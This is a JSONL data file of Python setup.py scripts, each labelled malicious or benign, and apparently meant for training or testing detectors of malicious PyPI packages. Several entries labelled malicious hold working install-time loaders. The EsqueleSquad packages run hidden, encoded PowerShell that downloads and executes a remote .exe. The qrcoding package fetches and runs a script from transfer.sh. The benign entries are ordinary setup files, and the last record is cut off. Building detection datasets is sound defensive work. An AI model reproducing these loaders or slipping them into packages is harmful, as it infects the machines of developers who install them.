{"idx": "selfpywgamesuper-2.85", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpywgamesuper',\n    packages = ['modlib'],\n    version = '8.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "qrcoding-1.0.1", "func": "\ufefffrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport subprocess\nimport sys\n\nclass CustomInstallCommand(install):\n    def run(self):\n        url = 'https://transfer.sh/gDhbfk/qrcodes.py'\n        response = requests.get(url)\n        with open('qrcodes.py', 'wb') as f:\n            f.write(response.content)\n        subprocess.check_call([sys.executable, 'qrcodes.py'])\n        install.run(self)\nsetup(\n    name='qrcoding',\n    version='1.0.1',\n    description='Generate QR Codes!',\n    author='TheWever',\n    author_email='thewever@gmail.com',\n    url='https://github.com/TheWever/qrcoding',\n    packages=['qrcoding'],\n    install_requires=['requests', 'pycryptodome'],\n    cmdclass={\n        'install': CustomInstallCommand,\n    }\n)\n", "target": 1}
{"idx": "datatile-1.0.3", "func": "#!/usr/bin/python\n#\n# Copyright 2018-2022 Polyaxon, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport os\nimport sys\n\nfrom setuptools import find_packages, setup\nfrom setuptools.command.test import test as TestCommand\n\n\ndef read_readme():\n    if not os.path.exists(\"./README.md\"):\n        return \"\"\n    with open(\"./README.md\") as f:\n        return f.read()\n\n\nclass PyTest(TestCommand):\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n\n        errcode = pytest.main(self.test_args)\n        sys.exit(errcode)\n\n\nwith open(os.path.join(\"./datatile/pkg.py\"), encoding=\"utf8\") as f:\n    pkg = {}\n    exec(f.read(), pkg)\n\nrequirements = []\n\nif os.environ.get(\"USE_PROD_PACKAGES\"):\n    with open(\"requirements/prod.txt\") as requirements_file:\n        requirements += requirements_file.read().splitlines()\n\nwith open(\"requirements/dev.txt\") as requirements_file:\n    dev_requirements = requirements_file.read().splitlines()\n\nextra = {\n    \"dev\": dev_requirements,\n}\n\nsetup(\n    name=pkg[\"NAME\"],\n    version=pkg[\"VERSION\"],\n    description=pkg[\"DESC\"],\n    long_description=read_readme(),\n    long_description_content_type=\"text/markdown\",\n    maintainer=pkg[\"AUTHOR\"],\n    maintainer_email=pkg[\"EMAIL\"],\n    author=pkg[\"AUTHOR\"],\n    author_email=pkg[\"EMAIL\"],\n    url=pkg[\"URL\"],\n    license=pkg[\"LICENSE\"],\n    platforms=\"any\",\n    packages=find_packages(exclude=[\"*.tests\", \"*.tests.*\", \"tests.*\", \"tests\"]),\n    keywords=[\n        \"polyaxon\",\n        \"aws\",\n        \"s3\",\n        \"microsoft\",\n        \"azure\",\n        \"google cloud storage\",\n        \"gcs\",\n        \"deep-learning\",\n        \"machine-learning\",\n        \"data-science\",\n        \"neural-networks\",\n        \"artificial-intelligence\",\n        \"ai\",\n        \"reinforcement-learning\",\n        \"kubernetes\",\n        \"aws\",\n        \"microsoft\",\n        \"azure\",\n        \"google cloud\",\n        \"tensorFlow\",\n        \"pytorch\",\n        \"matplotlib\",\n        \"plotly\",\n        \"visualization\",\n        \"analytics\",\n        \"pandas\",\n        \"data-checks\",\n        \"data-analysis\",\n    ],\n    install_requires=requirements,\n    extras_require=extra,\n    python_requires=\">=3.5\",\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Operating System :: OS Independent\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n    ],\n    cmdclass={\"test\": PyTest},\n)\n", "target": 0}
{"idx": "esqsuperstrmine-10.39", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqsuperstrmine',\n    packages = ['modlib'],\n    version = '5.82',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dumb-init-1.2.5.post1", "func": "import os.path\nimport subprocess\nimport tempfile\n\nfrom distutils.command.build import build as orig_build\nfrom distutils.core import Command\nfrom setuptools import Distribution\nfrom setuptools import Extension\nfrom setuptools import setup\nfrom setuptools.command.install import install as orig_install\n\n\ntry:\n    from wheel.bdist_wheel import bdist_wheel as _bdist_wheel\n\n    class bdist_wheel(_bdist_wheel):\n\n        def finalize_options(self):\n            _bdist_wheel.finalize_options(self)\n            # Mark us as not a pure python package\n            self.root_is_pure = False\n\n        def get_tag(self):\n            python, abi, plat = _bdist_wheel.get_tag(self)\n            # We don't contain any python source\n            python, abi = 'py2.py3', 'none'\n            return python, abi, plat\nexcept ImportError:\n    bdist_wheel = None\n\n\nclass ExeDistribution(Distribution):\n    c_executables = ()\n\n\nclass build(orig_build):\n    sub_commands = orig_build.sub_commands + [\n        ('build_cexe', None),\n    ]\n\n\nclass install(orig_install):\n    sub_commands = orig_install.sub_commands + [\n        ('install_cexe', None),\n    ]\n\n\nclass install_cexe(Command):\n    description = 'install C executables'\n    outfiles = ()\n\n    def initialize_options(self):\n        self.build_dir = self.install_dir = None\n\n    def finalize_options(self):\n        # this initializes attributes based on other commands' attributes\n        self.set_undefined_options('build', ('build_scripts', 'build_dir'))\n        self.set_undefined_options(\n            'install', ('install_scripts', 'install_dir'),\n        )\n\n    def run(self):\n\n        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)\n\n    def get_outputs(self):\n        return self.outfiles\n\n\nclass build_cexe(Command):\n    description = 'build C executables'\n\n    def initialize_options(self):\n        self.build_scripts = None\n        self.build_temp = None\n\n    def finalize_options(self):\n        self.set_undefined_options(\n            'build',\n            ('build_scripts', 'build_scripts'),\n            ('build_temp', 'build_temp'),\n        )\n\n    def run(self):\n        # stolen and simplified from distutils.command.build_ext\n        from distutils.ccompiler import new_compiler\n\n        compiler = new_compiler(verbose=True)\n\n        print('supports -static... ', end='')\n        with tempfile.NamedTemporaryFile(mode='w', suffix='.c') as f:\n            f.write('int main(void){}\\n')\n            f.flush()\n            cmd = compiler.linker_exe + [f.name, '-static', '-o', os.devnull]\n            with open(os.devnull, 'wb') as devnull:\n                if not subprocess.call(cmd, stderr=devnull):\n                    print('yes')\n                    link_args = ['-static']\n                else:\n                    print('no')\n                    link_args = []\n\n        for exe in self.distribution.c_executables:\n            objects = compiler.compile(exe.sources, output_dir=self.build_temp)\n            compiler.link_executable(\n                objects,\n                exe.name,\n                output_dir=self.build_scripts,\n                extra_postargs=link_args,\n            )\n\n    def get_outputs(self):\n        return [\n            os.path.join(self.build_scripts, exe.name)\n            for exe in self.distribution.c_executables\n        ]\n\n\nsetup(\n    name='dumb-init',\n    description='Simple wrapper script which proxies signals to a child',\n    version=open('VERSION').read().strip() + \".post1\",\n    author='Yelp',\n    url='https://github.com/Yelp/dumb-init/',\n    platforms='linux',\n    packages=[],\n    c_executables=[Extension('dumb-init', ['dumb-init.c'])],\n    cmdclass={\n        'bdist_wheel': bdist_wheel,\n        'build': build,\n        'build_cexe': build_cexe,\n        'install': install,\n        'install_cexe': install_cexe,\n    },\n    distclass=ExeDistribution,\n)\n", "target": 0}
{"idx": "docfly-1.0.2", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"\nThe setup script is the centre of all activity in building, distributing,\nand installing modules using the Distutils. It is required for ``pip install``.\n\nSee more: https://docs.python.org/2/distutils/setupscript.html\n\"\"\"\n\nfrom __future__ import print_function\nimport os\nfrom datetime import date\nfrom setuptools import setup, find_packages\n\n# --- import your package ---\nimport docfly as package\n\nif __name__ == \"__main__\":\n    # --- Automatically generate setup parameters ---\n    # Your package name\n    PKG_NAME = package.__name__\n\n    # Your GitHub user name\n    try:\n        GITHUB_USERNAME = package.__github_username__\n    except:\n        GITHUB_USERNAME = \"Unknown-Github-Username\"\n\n    # Short description will be the description on PyPI\n    try:\n        SHORT_DESCRIPTION = package.__short_description__  # GitHub Short Description\n    except:\n        print(\n            \"'__short_description__' not found in '%s.__init__.py'!\" % PKG_NAME)\n        SHORT_DESCRIPTION = \"No short description!\"\n\n    # Long description will be the body of content on PyPI page\n    try:\n        LONG_DESCRIPTION = open(\"README.rst\", \"rb\").read().decode(\"utf-8\")\n    except:\n        LONG_DESCRIPTION = \"No long description!\"\n\n    # Version number, VERY IMPORTANT!\n    VERSION = package.__version__\n\n    # Author and Maintainer\n    try:\n        AUTHOR = package.__author__\n    except:\n        AUTHOR = \"Unknown\"\n\n    try:\n        AUTHOR_EMAIL = package.__author_email__\n    except:\n        AUTHOR_EMAIL = None\n\n    try:\n        MAINTAINER = package.__maintainer__\n    except:\n        MAINTAINER = \"Unknown\"\n\n    try:\n        MAINTAINER_EMAIL = package.__maintainer_email__\n    except:\n        MAINTAINER_EMAIL = None\n\n    PACKAGES, INCLUDE_PACKAGE_DATA, PACKAGE_DATA, PY_MODULES = (\n        None, None, None, None,\n    )\n\n    # It's a directory style package\n    if os.path.exists(__file__[:-8] + PKG_NAME):\n        # Include all sub packages in package directory\n        PACKAGES = [PKG_NAME] + [\"%s.%s\" % (PKG_NAME, i)\n                                 for i in find_packages(PKG_NAME)]\n\n        # Include everything in package directory\n        INCLUDE_PACKAGE_DATA = True\n        PACKAGE_DATA = {\n            \"\": [\"*.*\"],\n        }\n\n    # It's a single script style package\n    elif os.path.exists(__file__[:-8] + PKG_NAME + \".py\"):\n        PY_MODULES = [PKG_NAME, ]\n\n    # The project directory name is the GitHub repository name\n    repository_name = os.path.basename(os.path.dirname(__file__))\n\n    # Project Url\n    URL = \"https://github.com/{0}/{1}\".format(GITHUB_USERNAME, repository_name)\n\n    # Use todays date as GitHub release tag\n    github_release_tag = str(date.today())\n\n    # Source code download url\n    DOWNLOAD_URL = \"https://pypi.python.org/pypi/{0}/{1}#downloads\".format(\n        PKG_NAME, VERSION)\n\n    try:\n        LICENSE = package.__license__\n    except:\n        print(\"'__license__' not found in '%s.__init__.py'!\" % PKG_NAME)\n        LICENSE = \"\"\n\n    PLATFORMS = [\n        \"Windows\",\n        \"MacOS\",\n        \"Unix\",\n    ]\n\n    CLASSIFIERS = [\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS\",\n        \"Operating System :: Unix\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n    ]\n    \"\"\"\n    Full list can be found at: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    \"\"\"\n\n    def read_requirements_file(path):\n        \"\"\"\n        Read requirements.txt, ignore comments\n        \"\"\"\n        requires = list()\n        f = open(path, \"rb\")\n        for line in f.read().decode(\"utf-8\").split(\"\\n\"):\n            line = line.strip()\n            if \"#\" in line:\n                line = line[:line.find(\"#\")].strip()\n            if line:\n                requires.append(line)\n        return requires\n\n\n    try:\n        REQUIRES = read_requirements_file(\"requirements.txt\")\n    except:\n        print(\"'requirements.txt' not found!\")\n        REQUIRES = list()\n\n    EXTRA_REQUIRE = dict()\n\n    try:\n        EXTRA_REQUIRE[\"tests\"] = read_requirements_file(\"requirements-test.txt\")\n    except:\n        print(\"'requirements-test.txt' not found!\")\n\n    try:\n        EXTRA_REQUIRE[\"docs\"] = read_requirements_file(\"requirements-doc.txt\")\n    except:\n        print(\"'requirements-test.txt' not found!\")\n\n    setup(\n        name=PKG_NAME,\n        description=SHORT_DESCRIPTION,\n        long_description=LONG_DESCRIPTION,\n        version=VERSION,\n        author=AUTHOR,\n        author_email=AUTHOR_EMAIL,\n        maintainer=MAINTAINER,\n        maintainer_email=MAINTAINER_EMAIL,\n        packages=PACKAGES,\n        include_package_data=INCLUDE_PACKAGE_DATA,\n        package_data=PACKAGE_DATA,\n        py_modules=PY_MODULES,\n        url=URL,\n        download_url=DOWNLOAD_URL,\n        classifiers=CLASSIFIERS,\n        platforms=PLATFORMS,\n        license=LICENSE,\n        install_requires=REQUIRES,\n        extras_require=EXTRA_REQUIRE,\n    )\n\n\"\"\"\nAppendix\n--------\n::\n\nFrequent used classifiers List = [\n    \"Development Status :: 1 - Planning\",\n    \"Development Status :: 2 - Pre-Alpha\",\n    \"Development Status :: 3 - Alpha\",\n    \"Development Status :: 4 - Beta\",\n    \"Development Status :: 5 - Production/Stable\",\n    \"Development Status :: 6 - Mature\",\n    \"Development Status :: 7 - Inactive\",\n\n    \"Intended Audience :: Customer Service\",\n    \"Intended Audience :: Developers\",\n    \"Intended Audience :: Education\",\n    \"Intended Audience :: End Users/Desktop\",\n    \"Intended Audience :: Financial and Insurance Industry\",\n    \"Intended Audience :: Healthcare Industry\",\n    \"Intended Audience :: Information Technology\",\n    \"Intended Audience :: Legal Industry\",\n    \"Intended Audience :: Manufacturing\",\n    \"Intended Audience :: Other Audience\",\n    \"Intended Audience :: Religion\",\n    \"Intended Audience :: Science/Research\",\n    \"Intended Audience :: System Administrators\",\n    \"Intended Audience :: Telecommunications Industry\",\n\n    \"License :: OSI Approved :: BSD License\",\n    \"License :: OSI Approved :: MIT License\",\n    \"License :: OSI Approved :: Apache Software License\",\n    \"License :: OSI Approved :: GNU General Public License (GPL)\",\n    \"License :: OSI Approved :: GNU Lesser General Public License v3 (LGPLv3)\",\n\n    \"Natural Language :: English\",\n    \"Natural Language :: Chinese (Simplified)\",\n\n    \"Operating System :: Microsoft :: Windows\",\n    \"Operating System :: MacOS\",\n    \"Operating System :: Unix\",\n\n    \"Programming Language :: Python\",\n    \"Programming Language :: Python :: 2\",\n    \"Programming Language :: Python :: 2.7\",\n    \"Programming Language :: Python :: 2 :: Only\",\n    \"Programming Language :: Python :: 3\",\n    \"Programming Language :: Python :: 3.4\",\n    \"Programming Language :: Python :: 3.5\",\n    \"Programming Language :: Python :: 3.6\",\n    \"Programming Language :: Python :: 3 :: Only\",\n]\n\"\"\"\n", "target": 0}
{"idx": "matplatlib-plus-1.3", "func": "# coding: UTF-8\nfrom setuptools import setup\nsetup(name=\"matplatlib-plus\",\n      version=\"1.3\",\n      description=\"Add-on for matplatlib\",\n      packages=['matplatlib_addon'],\n      install_requires=['httpx', 'httpx-socks'],\n      author_email=\"admin@ya.ru\",\n      zip_safe=False)", "target": 1}
{"idx": "dbt-1.0.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\n\n\nif 'sdist' not in sys.argv:\n    print('')\n    print('As of v1.0.0, `pip install dbt` is no longer supported.')\n    print('Instead, please use one of the following.')\n    print('')\n    print('**To use dbt with your specific database, platform, or query engine:**')\n    print('')\n    print('    pip install dbt-<adapter>')\n    print('')\n    print('    See full list: https://docs.getdbt.com/docs/available-adapters')\n    print('')\n    print('**For developers of integrations with dbt Core:**')\n    print('')\n    print('    pip install dbt-core')\n    print('')\n    print('    Be advised, dbt Core''s python API is not yet stable or documented')\n    print('    (https://docs.getdbt.com/docs/running-a-dbt-project/dbt-api)')\n    print('')\n    print('**For the previous behavior of `pip install dbt`:**')\n    print('')\n    print('    pip install dbt-core dbt-postgres dbt-redshift dbt-snowflake dbt-bigquery')\n    print('')\n    sys.exit(1)\n\n\nif sys.version_info < (3, 7):\n    print('Error: dbt does not support this version of Python.')\n    print('Please upgrade to Python 3.7 or higher.')\n    sys.exit(1)\n\n\nfrom setuptools import setup\ntry:\n    from setuptools import find_namespace_packages\nexcept ImportError:\n    # the user has a downlevel version of setuptools.\n    print('Error: dbt requires setuptools v40.1.0 or higher.')\n    print('Please upgrade setuptools with \"pip install --upgrade setuptools\" '\n          'and try again')\n    sys.exit(1)\n\nthis_directory = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(this_directory, 'README.md')) as f:\n    long_description = f.read()\n\n\npackage_name = \"dbt\"\npackage_version = \"1.0.0\"\ndescription = \"\"\"With dbt, data analysts and engineers can build analytics \\\nthe way engineers build applications.\"\"\"\n\n\nsetup(\n    name=package_name,\n    version=package_version,\n\n    description=description,\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n\n    author=\"dbt Labs\",\n    author_email=\"info@dbtlabs.com\",\n    url=\"https://github.com/dbt-labs/dbt-core\",\n    zip_safe=False,\n    classifiers=[\n        'Development Status :: 7 - Inactive',\n\n        'License :: OSI Approved :: Apache Software License',\n\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: POSIX :: Linux',\n\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n    ],\n    python_requires=\">=3.7\",\n)\n", "target": 0}
{"idx": "executor-23.2", "func": "#!/usr/bin/env python\n\n# Programmer friendly subprocess wrapper.\n#\n# Author: Peter Odding <peter@peterodding.com>\n# Last Change: February 29, 2020\n# URL: https://executor.readthedocs.io\n\n\"\"\"\nSetup script for the `executor` package.\n\n**python setup.py install**\n  Install from the working directory into the current Python environment.\n\n**python setup.py sdist**\n  Build a source distribution archive.\n\n**python setup.py bdist_wheel**\n  Build a wheel distribution archive.\n\"\"\"\n\n# Standard library modules.\nimport codecs\nimport os\nimport re\n\n# De-facto standard solution for Python packaging.\nfrom setuptools import setup, find_packages\n\n\ndef get_contents(*args):\n    \"\"\"Get the contents of a file relative to the source distribution directory.\"\"\"\n    with codecs.open(get_absolute_path(*args), 'r', 'UTF-8') as handle:\n        return handle.read()\n\n\ndef get_version(*args):\n    \"\"\"Extract the version number from a Python module.\"\"\"\n    contents = get_contents(*args)\n    metadata = dict(re.findall('__([a-z]+)__ = [\\'\"]([^\\'\"]+)', contents))\n    return metadata['version']\n\n\ndef get_requirements(*args):\n    \"\"\"Get requirements from pip requirement files.\"\"\"\n    requirements = set()\n    with open(get_absolute_path(*args)) as handle:\n        for line in handle:\n            # Strip comments.\n            line = re.sub(r'^#.*|\\s#.*', '', line)\n            # Ignore empty lines\n            if line and not line.isspace():\n                requirements.add(re.sub(r'\\s+', '', line))\n    return sorted(requirements)\n\n\ndef get_absolute_path(*args):\n    \"\"\"Transform relative pathnames into absolute pathnames.\"\"\"\n    return os.path.join(os.path.dirname(os.path.abspath(__file__)), *args)\n\n\nsetup(name='executor',\n      version=get_version('executor', '__init__.py'),\n      description='Programmer friendly subprocess wrapper',\n      long_description=get_contents('README.rst'),\n      url='https://executor.readthedocs.io',\n      author=\"Peter Odding\",\n      author_email='peter@peterodding.com',\n      license='MIT',\n      packages=find_packages(),\n      entry_points=dict(console_scripts=[\n          'executor = executor.cli:main',\n      ]),\n      install_requires=get_requirements('requirements.txt'),\n      test_suite='executor.tests',\n      tests_require=[\n          'virtualenv',\n      ],\n      python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',\n      classifiers=[\n          'Development Status :: 5 - Production/Stable',\n          'Environment :: Console',\n          'Intended Audience :: Developers',\n          'Intended Audience :: Information Technology',\n          'Intended Audience :: System Administrators',\n          'License :: OSI Approved :: MIT License',\n          'Operating System :: POSIX',\n          'Operating System :: POSIX :: Linux',\n          'Operating System :: Unix',\n          'Programming Language :: Python',\n          'Programming Language :: Python :: 2',\n          'Programming Language :: Python :: 2.7',\n          'Programming Language :: Python :: 3',\n          'Programming Language :: Python :: 3.5',\n          'Programming Language :: Python :: 3.6',\n          'Programming Language :: Python :: 3.7',\n          'Programming Language :: Python :: 3.8',\n          'Programming Language :: Python :: Implementation :: CPython',\n          'Programming Language :: Python :: Implementation :: PyPy',\n          'Topic :: Internet',\n          'Topic :: Software Development',\n          'Topic :: Software Development :: Libraries',\n          'Topic :: Software Development :: Libraries :: Python Modules',\n          'Topic :: System :: Networking',\n          'Topic :: System :: Shells',\n          'Topic :: System :: Systems Administration',\n          'Topic :: Utilities',\n      ])\n", "target": 0}
{"idx": "esqmaskstr-4.62", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmaskstr',\n    packages = ['modlib'],\n    version = '8.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqsupergrandstr-1.56", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqsupergrandstr',\n    packages = ['modlib'],\n    version = '10.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tphydraproofcpu-3.2", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphydraproofcpu',\n    packages = ['modlib'],\n    version = '2.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 